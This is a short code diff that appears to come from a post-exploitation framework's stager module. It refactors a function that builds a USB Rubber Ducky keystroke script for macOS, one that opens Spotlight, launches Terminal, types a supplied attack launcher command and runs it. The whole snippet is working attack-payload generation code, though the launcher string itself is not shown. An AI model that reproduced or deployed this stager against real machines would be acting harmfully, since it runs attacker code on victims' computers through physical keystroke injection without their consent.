@@ -74,15 +74,15 @@ class Stager:
         if launcher == "":
             print(helpers.color("[!] Error in launcher command generation."))
             return ""
-        else:
-            ducky_code = "DELAY 1000\n"
-            ducky_code += "COMMAND SPACE\n"
-            ducky_code += "DELAY 1000\n"
-            ducky_code += "STRING TERMINAL\n"
-            ducky_code += "ENTER \n"
-            ducky_code += "DELAY 1000\n"
-            ducky_code += "STRING " + launcher
-            ducky_code += "\nENTER\n"
-            ducky_code += "DELAY 1000\n"
 
-            return ducky_code
+        ducky_code = "DELAY 1000\n"
+        ducky_code += "COMMAND SPACE\n"
+        ducky_code += "DELAY 1000\n"
+        ducky_code += "STRING TERMINAL\n"
+        ducky_code += "ENTER \n"
+        ducky_code += "DELAY 1000\n"
+        ducky_code += "STRING " + launcher
+        ducky_code += "\nENTER\n"
+        ducky_code += "DELAY 1000\n"
+
+        return ducky_code
